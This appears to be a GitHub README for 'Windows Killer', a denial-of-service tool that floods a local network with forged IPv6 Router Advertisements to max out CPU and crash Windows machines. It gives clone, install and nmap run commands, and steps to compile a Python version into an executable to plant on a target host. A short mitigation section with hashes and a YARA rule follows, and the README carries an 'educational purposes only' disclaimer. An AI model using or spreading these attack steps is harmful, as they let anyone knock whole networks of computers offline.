# Windows Killer

Generates a flood of Router Advertisements (RA) with random source MAC addresses and IPv6 prefixes. Computers, which have stateless autoconfiguration enabled by default (every major OS), will start to compute IPv6 suffix and update their routing table to reflect the accepted announcement. This will cause 100% CPU usage on Windows and platforms, preventing to process other application requests.

# Install

git clone https://github.com/Kleptocratic/WindowsKiller.git

# Check for location of other NSE scripts

find / -name '*.nse'

# Move downloaded files into directory

sudo mv WindowsKiller.nse /usr/local/share/nmap/scripts/

# Execute script

nmap -6 --script WindowsKiller.nse --script-args 'interface=<interface>'
  
# WindowKiller.py
  
Designed as an eternal loop to be compiled as an executable and placed on target host, the script will pseudo-generate IPv6 Router Advertisements and flood the network with potential connections. Warning: this script will crash most, if not all, Windows operating systems within the LAN. This script is for educational purposes only. Be wise, stay legal.

# Compiling WindowsKiller.py as an Executable
  
Install PyInstaller from PyPI:

  pip install pyinstaller

Go to your program’s directory and run:

  pyinstaller --onefile WindowsKiller.py

Navigate to the "dist" file to find your executable!

# VirusTotal 
  
![WindowsKiller](https://user-images.githubusercontent.com/72598486/130345543-f3219aaa-651f-4787-8bd5-7614f6e0f731.png)

# Mitigation

## Hashes
  
```
Mac OSX - ed664d8bf41bb35ca3f09fb5c913a747cace873ec318d5857b0fe2cceb08089c
Linux - 4b8f3ef3376463bd4e9c92c4e20a61e33baf9648336ed7abcc17dd14299b918b
Windows - 
```
  
## YARA
 
```
rule WindowsKillerExecutable {
    meta:
      description = "Detects Windows Killer IPv6 Router Advertisement Denial of Service Executable"
      date = "2022-02-27"
      linuxhash = "4b8f3ef3376463bd4e9c92c4e20a61e33baf9648336ed7abcc17dd14299b918b"
      machash = "ed664d8bf41bb35ca3f09fb5c913a747cace873ec318d5857b0fe2cceb08089c"
    strings:
      $ = "_MEIPASS"
      $ = "PyMem_RawFree"
      $ = "sWindowsKiller"
      $ = "importlib.machinery"
      $ = "blib-dynload/_random.cpython"
    condition:
      all of them
}
